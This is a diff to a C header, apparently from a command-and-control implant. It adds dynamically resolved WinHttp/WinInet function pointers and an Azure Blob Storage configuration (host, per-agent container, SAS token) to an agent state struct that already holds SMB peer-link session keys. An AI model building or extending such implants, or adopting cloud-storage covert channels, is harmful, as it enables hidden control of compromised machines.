@@ -82,6 +82,7 @@ typedef BOOL      (WINAPI *fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD)
 typedef BOOL      (WINAPI *fnWinHttpCloseHandle)(HINTERNET);
 typedef BOOL      (WINAPI *fnWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
 typedef BOOL      (WINAPI *fnWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
+typedef BOOL      (WINAPI *fnWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
 
 // WinInet types
 typedef HINTERNET (WINAPI *fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
@@ -89,6 +90,7 @@ typedef HINTERNET (WINAPI *fnInternetConnectA)(HINTERNET, LPCSTR, WORD, LPCSTR, 
 typedef HINTERNET (WINAPI *fnHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
 typedef BOOL      (WINAPI *fnHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
 typedef BOOL      (WINAPI *fnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL      (WINAPI *fnHttpQueryInfoA)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD);
 typedef BOOL      (WINAPI *fnInternetCloseHandle)(HINTERNET);
 typedef BOOL      (WINAPI *fnInternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);
 
@@ -205,6 +207,7 @@ typedef struct _INSTANCE {
         fnWinHttpCloseHandle        WinHttpCloseHandle;
         fnWinHttpSetOption          WinHttpSetOption;
         fnWinHttpAddRequestHeaders  WinHttpAddRequestHeaders;
+        fnWinHttpQueryHeaders       WinHttpQueryHeaders;
 
         // WinInet
         fnInternetOpenA         InternetOpenA;
@@ -212,6 +215,7 @@ typedef struct _INSTANCE {
         fnHttpOpenRequestA      HttpOpenRequestA;
         fnHttpSendRequestA      HttpSendRequestA;
         fnInternetReadFile      InternetReadFile;
+        fnHttpQueryInfoA        HttpQueryInfoA;
         fnInternetCloseHandle   InternetCloseHandle;
         fnInternetSetOptionA    InternetSetOptionA;
 
@@ -331,6 +335,14 @@ typedef struct _INSTANCE {
         BYTE     link_key[32];          // active link-client session key (client's payload AES key)
         BOOL     have_link_key;
     } Smb;
+
+    // Azure Blob config
+    struct {
+        char     host[256];             // {account}.blob.core.windows.net
+        char     container[128];        // agent-{uuid12}
+        char     sas[1024];             // container-scoped SAS query string (no leading '?')
+        DWORD    msg_seq;               // per-message counter, mixed into message-id PRNG
+    } Blob;
 
     // Linked P2P peers (link/unlink) - client-side registry of agents we linked to
 #define ES_MAX_LINKED_PEERS 8
